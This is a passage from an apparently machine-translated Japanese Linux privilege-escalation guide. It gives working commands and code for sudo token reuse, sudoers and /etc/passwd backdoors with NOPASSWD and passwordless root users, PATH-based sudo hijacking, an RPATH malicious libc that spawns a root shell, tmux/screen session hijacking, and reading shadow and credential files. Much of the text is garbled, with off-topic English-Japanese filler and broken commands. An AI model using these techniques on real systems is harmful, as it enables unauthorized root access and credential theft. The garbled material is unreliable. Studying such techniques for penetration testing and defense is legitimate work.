* **最初のエクスプロイト**（`exploit.sh`）は、_tmp_ 内にバイナリ `activate_sudo_token` を作成します。これを使用して、セッションでsudoトークンを**アクティブにできます**（自動的にルートシェルは取得できませんが、`sudo su` を実行してください）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* **第二のエクスプロイト** (`exploit_v2.sh`) は、_rootによって所有され、setuidである_ _/tmp_ にshシェルを作成します。
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* **第三のエクスプロイト** (`exploit_v3.sh`) は、**sudo トークンを永続化し、すべてのユーザーが sudo を使用できるようにする sudoers ファイルを作成**します。
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<ユーザー名>

もし、そのフォルダまたはフォルダ内の作成されたファイルのいずれかに**書き込み権限**がある場合、バイナリ[**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools)を使用して、ユーザーとPIDのためのsudoトークンを**作成**することができます。\
例えば、ユーザー名がsampleuserで、PIDが1234のシェルを持っている場合、ファイル_/var/run/sudo/ts/sampleuser_を上書きすることができ、パスワードを知る必要なくsudo特権を**取得**することができます。以下のように実行します：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` と `/etc/sudoers.d` 内のファイルは、`sudo` を使用できるユーザーとその方法を設定します。これらのファイルは**デフォルトでは root ユーザーと root グループのみが読み取り可能**です。\
このファイルを**読み取ることができる場合**、興味深い情報を**入手することができる**かもしれません。また、任意のファイルを**書き込むことができる場合**、特権を**昇格させることができます**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
もし書き込み権限があれば、それを悪用することができます。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo`バイナリの代わりとして、OpenBSDでは`doas`などのいくつかの選択肢があります。`/etc/doas.conf`でその設定を確認することを忘れないでください。
```
permit nopass demo as root cmd vim
```
### Sudoハイジャック

もし、あるユーザーが通常マシンに接続し、特権を昇格させるために`sudo`を使用することを知っている場合、そのユーザーコンテキスト内でシェルを取得した場合、**rootとしてコードを実行し、その後にユーザーのコマンドを実行する新しいsudo実行可能ファイルを作成**することができます。そして、ユーザーコンテキストの$PATHを変更します（たとえば、.bash\_profileに新しいパスを追加する）ので、ユーザーがsudoを実行すると、あなたのsudo実行可能ファイルが実行されます。

ただし、ユーザーが別のシェル（bash以外）を使用している場合は、新しいパスを追加するために他のファイルを変更する必要があります。たとえば、[sudo-piggyback](https://github.com/APTy/sudo-piggyback)は`~/.bashrc`、`~/.zshrc`、`~/.bash_profile`を変更します。[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)には別の例があります。

## 共有ライブラリ

### ld.so

ファイル`/etc/ld.so.conf`は、**ロードされた設定ファイルの場所**を示しています。通常、このファイルには次のパスが含まれています：`include /etc/ld.so.conf.d/*.conf`

これは、`/etc/ld.so.conf.d/*.conf`の設定ファイルが読み込まれることを意味します。この設定ファイルは、**ライブラリが検索される他のフォルダー**を指すことがあります。たとえば、`/etc/ld.so.conf.d/libc.conf`の内容は`/usr/local/lib`です。**これはシステムが`/usr/local/lib`内のライブラリを検索することを意味します**。

何らかの理由で、ユーザーが指定されたパスのいずれか（`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/`内の任意のファイル、または`/etc/ld.so.conf.d/*.conf`内の設定ファイル内の任意のフォルダー）に書き込み権限を持っている場合、特権を昇格させることができるかもしれません。\
次のページで、この設定ミスを悪用する方法を見てみましょう：

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`/var/tmp/flag15/`にライブラリをコピーすることで、`RPATH`変数で指定された場所にあるプログラムによって使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に、`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`を使用して、`/var/tmp`に悪意のあるライブラリを作成します。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 機能

Linuxの機能は、プロセスに利用可能なルート特権の一部を提供します。これにより、ルート特権がより小さく独立した単位に分割されます。それぞれの単位は個別にプロセスに付与することができます。これにより、特権の完全なセットが減少し、攻撃のリスクが低下します。
詳細については、次のページを読んで機能について詳しく学びましょう。

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## ディレクトリのパーミッション

ディレクトリ内の「実行」ビットは、影響を受けるユーザーがフォルダに「cd」できることを意味します。
「読み取り」ビットは、ユーザーがファイルを「リスト」できることを意味し、「書き込み」ビットは、ユーザーがファイルを「削除」および「作成」できることを意味します。

## ACL（アクセス制御リスト）

ACL（アクセス制御リスト）は、標準のugo/rwxの権限を上書きする可能性のある2番目のレベルの任意の権限です。正しく使用すると、ファイルやディレクトリへのアクセスを設定する際に、より細かい粒度でアクセスを設定できます。たとえば、ファイルの所有者でもグループの所有者でもない特定のユーザーにアクセスを許可または拒否することができます（[ここから](https://linuxconfig.org/how-to-manage-acls-on-linux)）。
ユーザー「kali」にファイルの読み取りと書き込みの権限を与えます。
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**システムから特定のACLを持つファイルを取得する方法:**

To get files with specific ACLs from the system, you can use the following command:

システムから特定のACLを持つファイルを取得するには、次のコマンドを使用します。

```bash
getfacl -R /path/to/directory | grep "specific_acl"
```

Replace `/path/to/directory` with the actual directory path where you want to search for files. Replace `"specific_acl"` with the specific ACL you are looking for.

`/path/to/directory`を実際のディレクトリパスに置き換えて、ファイルを検索したいディレクトリを指定します。`"specific_acl"`を探している特定のACLに置き換えてください。

This command will recursively search for files in the specified directory and its subdirectories, and display the ACLs of those files. The `grep` command is used to filter the output and display only the files with the specific ACL.

このコマンドは、指定したディレクトリとそのサブディレクトリ内のファイルを再帰的に検索し、それらのファイルのACLを表示します。`grep`コマンドは、出力をフィルタリングして特定のACLを持つファイルのみを表示するために使用されます。
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## シェルセッションを開く

**古いバージョン**では、異なるユーザー（**root**）のいくつかの**シェル**セッションを**乗っ取る**ことができます。\
**最新バージョン**では、**自分のユーザー**のスクリーンセッションにのみ**接続**できます。ただし、セッション内には**興味深い情報**が含まれている可能性があります。

### スクリーンセッションの乗っ取り

**スクリーンセッションの一覧表示**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
**セッションにアタッチする**

To attach to a session, use the following command:

セッションにアタッチするには、以下のコマンドを使用します。

```bash
tmux attach-session -t <session_name>
```

Replace `<session_name>` with the name of the session you want to attach to.

`<session_name>` をアタッチしたいセッションの名前に置き換えてください。

**Detach from a session**

**セッションからデタッチする**

To detach from a session, use the following key combination:

セッションからデタッチするには、以下のキーコンビネーションを使用します。

```
Ctrl + b, d
```

**Create a new session**

**新しいセッションを作成する**

To create a new session, use the following command:

新しいセッションを作成するには、以下のコマンドを使用します。

```bash
tmux new-session -s <session_name>
```

Replace `<session_name>` with the desired name for the new session.

`<session_name>` を新しいセッションの名前に置き換えてください。

**List sessions**

**セッションの一覧を表示する**

To list all active sessions, use the following command:

すべてのアクティブなセッションを一覧表示するには、以下のコマンドを使用します。

```bash
tmux list-sessions
```

**Kill a session**

**セッションを終了する**

To kill a session, use the following command:

セッションを終了するには、以下のコマンドを使用します。

```bash
tmux kill-session -t <session_name>
```

Replace `<session_name>` with the name of the session you want to kill.

`<session_name>` を終了したいセッションの名前に置き換えてください。
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmuxセッションの乗っ取り

これは**古いtmuxバージョン**の問題でした。特権を持たないユーザーとして作成されたルートのtmux（v2.1）セッションを乗っ取ることができませんでした。

**tmuxセッションの一覧表示**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
**セッションにアタッチする**

To attach to a session, use the following command:

セッションにアタッチするには、以下のコマンドを使用します:

```bash
tmux attach-session -t <session_name>
```

Replace `<session_name>` with the name of the session you want to attach to.

`<session_name>` をアタッチしたいセッションの名前に置き換えてください。

If you are unsure about the available sessions, you can list them using the command:

利用可能なセッションについて確認する場合は、次のコマンドを使用してリストを表示できます:

```bash
tmux list-sessions
```

This will display a list of all active sessions.

これにより、すべてのアクティブなセッションのリストが表示されます。

**Detach from a session**

**セッションからデタッチする**

To detach from a session, simply press `Ctrl` + `b` followed by `d`.

セッションからデタッチするには、単に `Ctrl` + `b` を押した後に `d` を押します。

**Create a new session**

**新しいセッションを作成する**

To create a new session, use the following command:

新しいセッションを作成するには、以下のコマンドを使用します:

```bash
tmux new-session -s <session_name>
```

Replace `<session_name>` with the desired name for the new session.

`<session_name>` を新しいセッションの名前に置き換えてください。

**Switch between sessions**

**セッション間を切り替える**

To switch between sessions, use the following command:

セッション間を切り替えるには、以下のコマンドを使用します:

```bash
tmux switch-client -t <session_name>
```

Replace `<session_name>` with the name of the session you want to switch to.

`<session_name>` を切り替えたいセッションの名前に置き換えてください。

**Kill a session**

**セッションを終了する**

To kill a session, use the following command:

セッションを終了するには、以下のコマンドを使用します:

```bash
tmux kill-session -t <session_name>
```

Replace `<session_name>` with the name of the session you want to kill.

`<session_name>` を終了したいセッションの名前に置き換えてください。
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
**Valentine box from HTB**の例を参照してください。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日までの間にDebianベースのシステム（Ubuntu、Kubuntuなど）で生成されたすべてのSSLおよびSSHキーは、このバグの影響を受ける可能性があります。\
このバグは、これらのOSで新しいsshキーを作成する際に発生します。**32,768のバリエーションしか可能ではありません**。つまり、すべての可能性を計算することができ、**sshの公開鍵を持っていれば、対応する秘密鍵を検索することができます**。計算された可能性はこちらで見つけることができます：[https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSHの興味深い設定値

* **PasswordAuthentication:** パスワード認証が許可されているかどうかを指定します。デフォルトは `no` です。
* **PubkeyAuthentication:** 公開鍵認証が許可されているかどうかを指定します。デフォルトは `yes` です。
* **PermitEmptyPasswords**: パスワード認証が許可されている場合、サーバーが空のパスワード文字列を持つアカウントへのログインを許可するかどうかを指定します。デフォルトは `no` です。

### PermitRootLogin

rootがsshを使用してログインできるかどうかを指定します。デフォルトは `no` です。可能な値は以下の通りです：

* `yes`: rootはパスワードと秘密鍵を使用してログインできます
* `without-password`または`prohibit-password`: rootは秘密鍵のみを使用してログインできます
* `forced-commands-only`: rootは秘密鍵のみを使用してログインし、コマンドオプションが指定されている場合にのみログインできます
* `no` : できません

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵が含まれるファイルを指定します。`%h`のようなトークンを含めることができます。これはホームディレクトリに置き換えられます。**絶対パス**（`/`で始まる）または**ユーザーのホームからの相対パス**を指定できます。例えば：
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー「testusername」の**プライベート**キーでログインしようとする場合、sshはあなたのキーの公開キーを`/home/testusername/.ssh/authorized_keys`と`/home/testusername/access`にあるキーと比較します。

### ForwardAgent/AllowAgentForwarding

SSHエージェント転送を使用すると、サーバーに鍵（パスフレーズなし！）を残さずに、ローカルのSSHキーを使用できます。したがって、sshを介して**ホスト**に**ジャンプ**し、そこから**初期ホスト**にある**キー**を使用して、別の**ホストにジャンプ**することができます。

このオプションを`$HOME/.ssh.config`に次のように設定する必要があります：
```
Host example.com
ForwardAgent yes
```
注意してください。もし`Host`が`*`の場合、ユーザーが別のマシンに移動するたびに、そのホストはキーにアクセスできるようになります（これはセキュリティ上の問題です）。

ファイル`/etc/ssh_config`はこの設定を上書きし、この構成を許可または拒否することができます。\
ファイル`/etc/sshd_config`はキーワード`AllowAgentForwarding`（デフォルトは許可）を使用してssh-agentの転送を許可または拒否することができます。

もし環境にフォワードエージェントが設定されている場合は、\[**ここで特権エスカレーションの方法を確認してください**]\(ssh-forward-agent-exploitation.md)。

## 興味深いファイル

### プロファイルファイル

ファイル`/etc/profile`および`/etc/profile.d/`以下のファイルは、ユーザーが新しいシェルを実行したときに実行されるスクリプトです。したがって、これらのファイルのいずれかを書き込むか変更することで特権をエスカレーションすることができます。
```bash
ls -l /etc/profile /etc/profile.d/
```
もし奇妙なプロファイルスクリプトが見つかった場合は、それを**機密情報**のためにチェックする必要があります。

### Passwd/Shadow ファイル

OSによっては、`/etc/passwd`と`/etc/shadow`ファイルの名前が異なる場合や、バックアップが存在する場合があります。そのため、**それらをすべて見つけて**、ファイル内に**ハッシュがあるかどうか**を確認するために、それらを**読み取ることができるかどうか**をチェックすることが推奨されます。
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
いくつかの場合には、`/etc/passwd`（または同等の）ファイル内に**パスワードハッシュ**を見つけることができます。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、次のコマンドのいずれかを使用してパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
次に、ユーザー`hacker`を追加し、生成されたパスワードを追加します。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

`su`コマンドを使用して`hacker:hacker`でログインできます。

または、以下の行を使用してパスワードのないダミーユーザーを追加することもできます。\
警告: 現在のマシンのセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意：BSDプラットフォームでは、`/etc/passwd`は`/etc/pwd.db`および`/etc/master.passwd`に配置されており、`/etc/shadow`は`/etc/spwd.db`に名前が変更されています。

あなたはいくつかの**機密ファイルに書き込むことができるか**を確認する必要があります。例えば、**サービスの設定ファイル**に書き込むことができますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
たとえば、マシンが**tomcat**サーバーを実行しており、**/etc/systemd/内のTomcatサービスの設定ファイルを変更できる**場合、次の行を変更できます：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
次に、tomcatが起動される際にバックドアが実行されます。

### フォルダのチェック

次のフォルダにはバックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (おそらく最後のフォルダは読み取ることができないかもしれませんが、試してみてください)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/所有ファイル

Sometimes, during a privilege escalation process, you may come across files or directories in unusual locations or owned by unexpected users. These findings can be valuable for further exploitation or gaining higher privileges.

以下は、特権エスカレーションのプロセス中に、予想外の場所にあるファイルやディレクトリ、または予期しないユーザーが所有するファイルに遭遇することがあります。これらの発見は、さらなる攻撃や高い特権の獲得に役立つことがあります。

#### Unusual File Locations

Look for files in non-standard directories, as they may contain sensitive information or configuration files that can be leveraged for privilege escalation. Some common non-standard locations to check are:

- `/var/backups`
- `/var/cache`
- `/var/lib`
- `/var/local`
- `/var/mail`
- `/var/opt`
- `/var/run`
- `/var/spool`
- `/var/tmp`

奇妙な場所にあるファイルを探し、特権エスカレーションに利用できる機密情報や設定ファイルが含まれている可能性があります。チェックすべき一般的な非標準の場所は以下の通りです。

- `/var/backups`
- `/var/cache`
- `/var/lib`
- `/var/local`
- `/var/mail`
- `/var/opt`
- `/var/run`
- `/var/spool`
- `/var/tmp`

#### Unexpected File Owners

Pay attention to files owned by users other than the expected system users or administrators. These files may have been left behind by previous users or misconfigured by system administrators, providing an opportunity for privilege escalation. Some common unexpected file owners to look for are:

- `root` (superuser)
- `www-data` (Apache web server)
- `mysql` (MySQL database)
- `postgres` (PostgreSQL database)
- `tomcat` (Tomcat web server)
- `wwwrun` (SAP web server)
- `www` (Nginx web server)
- `ftp` (FTP server)
- `bin` (Binary files)
- `daemon` (System daemon processes)

予想されるシステムユーザーや管理者以外のユーザーが所有するファイルに注意してください。これらのファイルは、以前のユーザーによって残されたものであるか、システム管理者によって誤って設定されたものである可能性があり、特権エスカレーションの機会を提供します。探すべき一般的な予期しないファイル所有者は以下の通りです。

- `root`（スーパーユーザー）
- `www-data`（Apacheウェブサーバー）
- `mysql`（MySQLデータベース）
- `postgres`（PostgreSQLデータベース）
- `tomcat`（Tomcatウェブサーバー）
- `wwwrun`（SAPウェブサーバー）
- `www`（Nginxウェブサーバー）
- `ftp`（FTPサーバー）
- `bin`（バイナリファイル）
- `daemon`（システムデーモンプロセス）
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最後の数分で変更されたファイル

To identify the files that have been modified in the last few minutes, you can use the following command:

最後の数分で変更されたファイルを特定するために、次のコマンドを使用できます。

```bash
find / -type f -mmin -5
```

This command will search for all files (`-type f`) in the entire system (`/`) that have been modified in the last 5 minutes (`-mmin -5`).

このコマンドは、最後の5分間 (`-mmin -5`) に変更された、システム全体 (`/`) のすべてのファイル (`-type f`) を検索します。

You can adjust the time interval by changing the value after `-mmin`. For example, if you want to find files modified in the last 10 minutes, you can use `-mmin -10`.

`-mmin` の後の値を変更することで、時間間隔を調整することができます。例えば、最後の10分間に変更されたファイルを検索したい場合は、`-mmin -10` を使用します。

Keep in mind that this command may take some time to execute, especially if you have a large filesystem. Additionally, the command will only search for files that your user has permission to access.

このコマンドは、特に大きなファイルシステムを持っている場合、実行に時間がかかる場合があります。また、このコマンドは、ユーザーがアクセス権を持っているファイルのみを検索します。

It's important to note that this technique can be useful for identifying recently modified files, but it does not necessarily indicate any malicious activity.
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB ファイル

SQLiteは、軽量で埋め込み型のデータベースエンジンであり、多くのアプリケーションで使用されています。SQLiteデータベースは、単一のファイルに格納され、拡張子が`.db`または`.sqlite`で終わります。

SQLiteデータベースファイルは、機密情報や重要なデータを含む可能性があります。したがって、特権昇格のための攻撃時には、これらのファイルを探すことが重要です。

以下は、SQLiteデータベースファイルを見つけるためのいくつかの一般的な場所です。

- `/var/www/html`：Webアプリケーションのデータベースファイルが格納される場所。
- `/var/lib/mysql`：MySQLデータベースのデフォルトの場所。
- `/var/lib/postgresql`：PostgreSQLデータベースのデフォルトの場所。
- `/home/<username>`：ユーザーのホームディレクトリ内にデータベースファイルがある場合があります。

これらの場所にアクセスするためには、特権昇格が必要です。特権昇格のための他のテクニックを使用して、これらのファイルにアクセスすることができます。
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
fils=`find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null`Hidden files
```
### 隠しファイル

Hidden files（隠しファイル）は、Linuxシステムで一般的に使用されるセキュリティ機能です。これらのファイルは、通常のファイルと同じようにディレクトリ内に存在しますが、名前の先頭にドット（.）が付いているため、一般的には表示されません。

隠しファイルは、システムの設定や構成情報、重要なデータなど、セキュリティ上の理由から一般ユーザーから隠される必要がある情報を格納するために使用されます。

隠しファイルを表示するには、`ls`コマンドに`-a`オプションを追加します。例えば、`ls -a`コマンドを使用すると、隠しファイルも含めてディレクトリ内のすべてのファイルが表示されます。

隠しファイルは、システムのセキュリティを向上させるために使用されることがありますが、悪意のあるユーザーによって悪用される可能性もあります。したがって、システム管理者は適切なアクセス制御を実施し、隠しファイルに対する適切な保護を確保する必要があります。
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATHにあるスクリプト/バイナリ**

If you find a script or binary in the system's PATH, it may be possible to escalate privileges by replacing it with a malicious version or by exploiting its functionality.

システムのPATHにスクリプトやバイナリがある場合、それを悪意のあるバージョンに置き換えるか、その機能を悪用することで特権を昇格させることができるかもしれません。

To identify scripts or binaries in the PATH, you can use the following command:

PATHにあるスクリプトやバイナリを特定するには、次のコマンドを使用できます:

```bash
echo $PATH | tr ':' '\n'
```

Once you have identified a script or binary, you can search for vulnerabilities or misconfigurations that may allow privilege escalation.

スクリプトやバイナリを特定したら、特権昇格を許可する可能性のある脆弱性や設定ミスを検索することができます。

Additionally, you can check the permissions and ownership of the script or binary using the `ls` command:

さらに、`ls`コマンドを使用してスクリプトやバイナリのパーミッションと所有者を確認することもできます:

```bash
ls -l /path/to/script_or_binary
```

If the script or binary is owned by a privileged user or has the setuid or setgid permissions, it may be possible to escalate privileges.

スクリプトやバイナリが特権ユーザーに所有されているか、setuidやsetgidのパーミッションを持っている場合、特権昇格が可能かもしれません。

Remember to always exercise caution when modifying or exploiting scripts or binaries, as it can have unintended consequences and may be illegal without proper authorization.

スクリプトやバイナリを変更したり悪用する際には常に注意を払い、意図しない結果をもたらす可能性があることや、適切な権限がない場合は違法である可能性があることを忘れないでください。
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **ウェブファイル**

Web files are files that are accessible through a web server. These files can include HTML, CSS, JavaScript, image files, and other resources that are used to build and display websites.

ウェブファイルは、ウェブサーバーを通じてアクセス可能なファイルです。これらのファイルには、ウェブサイトの構築と表示に使用されるHTML、CSS、JavaScript、画像ファイルなどのリソースが含まれることがあります。

When performing a web application penetration test, it is important to identify and analyze the web files present on the target application. This can help in understanding the structure of the application, identifying potential vulnerabilities, and finding ways to exploit them.

ウェブアプリケーションのペネトレーションテストを実施する際には、対象アプリケーションに存在するウェブファイルを特定し、分析することが重要です。これにより、アプリケーションの構造を理解し、潜在的な脆弱性を特定し、それらを悪用する方法を見つけることができます。

Some common web files that you may encounter during a penetration test include:

ペネトレーションテスト中に遭遇する可能性のある一般的なウェブファイルには、次のものがあります。

- **index.html**: This is the default file that is loaded when accessing the root directory of a website. It often contains the main content of the website.

- **index.html**: これは、ウェブサイトのルートディレクトリにアクセスしたときに読み込まれるデフォルトのファイルです。通常、ウェブサイトの主要なコンテンツが含まれています。

- **style.css**: This file contains the CSS code that is used to style the HTML elements of a website.

- **style.css**: このファイルには、ウェブサイトのHTML要素にスタイルを適用するために使用されるCSSコードが含まれています。

- **script.js**: This file contains the JavaScript code that is used to add interactivity and functionality to a website.

- **script.js**: このファイルには、ウェブサイトに対話性と機能を追加するために使用されるJavaScriptコードが含まれています。

- **image.jpg**: This is an example of an image file that may be used on a website. Images are often used to enhance the visual appeal of a website.

- **image.jpg**: これは、ウェブサイトで使用される可能性のある画像ファイルの例です。画像は、ウェブサイトの視覚的な魅力を高めるためによく使用されます。

During a penetration test, it is important to thoroughly analyze these web files to identify any potential vulnerabilities or misconfigurations that could be exploited. This can include checking for sensitive information, insecure file permissions, or any other security issues that may be present.

ペネトレーションテスト中には、これらのウェブファイルを徹底的に分析し、悪用できる潜在的な脆弱性や誤った設定を特定することが重要です。これには、機密情報のチェック、安全でないファイルのアクセス許可の確認、その他のセキュリティ上の問題の確認などが含まれます。
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**

Backups are an essential part of any system's security and resilience strategy. They help protect against data loss, system failures, and even ransomware attacks. In the event of a security breach or system compromise, having recent and reliable backups can be a lifesaver.

バックアップは、システムのセキュリティと耐障害性戦略の重要な要素です。データの損失、システムの障害、さらにはランサムウェア攻撃に対して保護を提供します。セキュリティ侵害やシステムの侵害が発生した場合、最新かつ信頼性のあるバックアップを持っていることは救いの手となります。

Regularly backing up critical data and system configurations is crucial. It is recommended to automate the backup process to ensure consistency and minimize the risk of human error. Additionally, backups should be stored in a secure location, preferably offsite or in the cloud, to protect against physical damage or theft.

重要なデータとシステムの設定を定期的にバックアップすることは重要です。バックアッププロセスを自動化し、一貫性を確保し、人為的なミスのリスクを最小限に抑えることが推奨されています。さらに、バックアップは物理的な損傷や盗難に対して保護するため、オフサイトまたはクラウド上の安全な場所に保存することが望ましいです。

It is also important to regularly test the backup and restore processes to ensure their effectiveness. This can be done by simulating various scenarios, such as data corruption or system failure, and verifying that the backups can be successfully restored.

バックアップとリストアのプロセスの効果を確認するために、定期的にテストすることも重要です。データの破損やシステムの障害など、さまざまなシナリオをシミュレートし、バックアップが正常にリストアできることを検証することができます。

Remember, backups are not a substitute for proper security measures. They should be used in conjunction with other security practices, such as regular software updates, strong passwords, and access control mechanisms, to ensure comprehensive protection against potential threats.

バックアップは適切なセキュリティ対策の代替手段ではありません。定期的なソフトウェアの更新、強力なパスワード、アクセス制御メカニズムなど、他のセキュリティ対策と併用することで、潜在的な脅威に対する包括的な保護を確保する必要があります。
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/nulll
```
### パスワードが含まれる既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)のコードを読み、**複数のパスワードが含まれる可能性のあるファイル**を検索します。\
これを行うために使用できるもう1つの興味深いツールは、[**LaZagne**](https://github.com/AlessandroZ/LaZagne)です。これは、Windows、Linux、Mac上のローカルコンピュータに保存されている多くのパスワードを取得するためのオープンソースアプリケーションです。

### ログ

ログを読むことができれば、**興味深い/機密情報を見つける**ことができるかもしれません。ログが奇妙であればあるほど、それはより興味深いでしょう（おそらく）。\
また、一部の「**悪意のある**」設定（バックドア？）された**監査ログ**では、この投稿で説明されているように、監査ログ内にパスワードを**記録する**ことができる場合があります：[https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)。
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
